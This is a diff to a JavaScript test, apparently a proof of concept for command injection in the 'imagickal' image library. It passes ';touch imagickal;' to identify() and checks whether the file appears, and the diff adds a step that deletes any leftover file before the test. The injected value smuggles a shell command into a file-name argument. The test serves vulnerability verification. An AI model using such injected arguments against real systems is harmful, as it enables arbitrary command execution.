@@ -4,19 +4,19 @@ test("Remote code execution in imagickal", () => {
   const fs = require("fs");
   const path = "./imagickal";
   const sleep = require("sleep");
-
-  //checking that its not present already
+  try {
+    fs.unlinkSync(path);
+    console.log("File removed:", path);
+  } catch (err) {
+    console.error(err);
+  }
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
-
   try {
     im.identify(";touch imagickal;").then(function (data) {});
   } catch (error) {}
-
   sleep.sleep(3);
-  //checking that its created by after exploit.
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
-
-  fs.unlink(path, function (err) {}); //deleting the file after creation
+  fs.unlink(path, function (err) {});
 });
